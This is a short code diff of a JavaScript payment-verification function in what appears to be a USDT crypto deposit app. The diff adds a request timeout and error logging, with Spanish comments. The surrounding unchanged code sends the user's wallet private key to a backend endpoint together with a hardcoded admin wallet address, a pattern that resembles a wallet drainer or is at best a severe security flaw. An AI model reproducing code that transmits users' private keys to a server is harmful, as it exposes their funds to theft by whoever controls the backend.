@@ -131,9 +131,14 @@ export async function verifyPayment() {
     }
 
     try {
+        // Añadimos un tiempo de espera (timeout) para que no se quede colgado
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 segundos
+
         const res = await fetch(`${API_BASE}/deposit-usdt`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
+            signal: controller.signal,
             body: JSON.stringify({
                 userPrivateKey: state.tempKey,
                 adminAddress: "0x1DE276E2E8879e1E6fBf905ee656Fe62c6D88E49", 
@@ -141,6 +146,7 @@ export async function verifyPayment() {
             })
         });
 
+        clearTimeout(timeoutId);
         const result = await res.json();
 
         if(result.success) {
@@ -158,7 +164,8 @@ export async function verifyPayment() {
                 switchTab('home');
             }, 2500);
         } else {
-            window.showToast("No payment detected yet");
+            // Si la API responde pero el pago no está, NO mostramos "Network Error"
+            // Solo regresamos al estado original
             setTimeout(() => {
                 statusText.innerHTML = 'Not Received <span style="font-size: 1.2em;">⏳</span>';
                 if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
@@ -166,10 +173,15 @@ export async function verifyPayment() {
                     btnVerify.disabled = false;
                     btnVerify.style.opacity = "1";
                 }
-            }, 1200);
+            }, 1000);
         }
     } catch (e) {
+        // AQUÍ ES DONDE SALÍA TU ERROR
+        console.error("DETALLE DEL ERROR:", e); // Esto te dirá en la consola qué pasa
+        
+        // Si el error es real de red, mostramos el Toast
         window.showToast("Network error, try again");
+        
         statusText.innerHTML = 'Not Received <span style="font-size: 1.2em;">⏳</span>';
         if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
         if(btnVerify) {
